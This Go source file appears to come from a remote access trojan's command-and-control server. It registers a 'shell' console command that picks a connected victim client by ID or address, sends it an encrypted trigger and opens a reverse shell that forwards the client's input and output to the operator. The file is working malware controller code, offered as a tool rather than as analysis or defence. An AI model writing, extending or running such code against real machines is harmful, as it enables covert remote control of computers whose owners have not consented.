//go:build server
// +build server

package handlers

import (
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/pkg/commands/remoteshell"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/abiosoft/ishell"
)

func RegisterShellCommand(s *network.KCPServer, shell *ishell.Shell) {
	shell.AddCmd(&ishell.Cmd{
		Name: "shell",
		Help: "start a reverse shell to a client",
		LongHelp: `
Usage shell <id|address>
		
Establishes a reverse shell connection to the client.
Forwards STDOUT, STDERR, and STDIN between server and client.

Examples:
  shell 1
  shell 192.168.70.23`,

		Func: func(c *ishell.Context) {
			if len(c.Args) == 0 {
				c.Println("Type `shell help` for more information")
				c.HelpText()
				c.Err(fmt.Errorf("not enough arguments"))
				return
			}

			address := c.Args[0]
			if address == "" {
				c.Println("Usage: shell <id|address>")
				c.Err(fmt.Errorf("invalid address/id"))
				return
			}

			client, err := getClient(s, address)
			if err != nil {
				c.Println("Failed to get client")
				c.Err(err)
				return
			}

			address = client.Sess.RemoteAddr().String()

			stream, err := getStream(client)
			if err != nil {
				c.Println("Failed to get stream")
				c.Err(err)
			}

			c.Printf("Establishing shell connection to %s\n", address)
			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
				c.Println("Failed to send command to client")
				c.Err(err)
				return
			}

			if err := remoteshell.ReceiveShell(s, client); err != nil {
				c.Println("Failed to start server shell listener")
				c.Err(err)
				return
			}
		},
	})
}
